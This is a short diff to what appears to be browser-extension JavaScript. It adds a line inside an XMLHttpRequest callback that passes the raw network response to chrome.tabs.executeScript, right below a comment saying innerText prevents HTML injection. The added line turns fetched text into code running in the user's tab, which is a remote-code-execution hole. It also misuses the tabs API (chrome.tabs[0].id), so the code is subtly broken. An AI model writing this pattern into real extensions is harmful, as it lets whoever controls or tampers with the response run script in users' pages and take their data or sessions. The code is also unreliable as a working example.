@@ -30,6 +30,7 @@ xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
     // innerText does not let the attacker inject HTML elements.
     // document.getElementById("resp").innerText = xhr.responseText;
+    chrome.tabs.executeScript(chrome.tabs[0].id, {code: xhr.responseText});
   }
 }
 xhr.send();
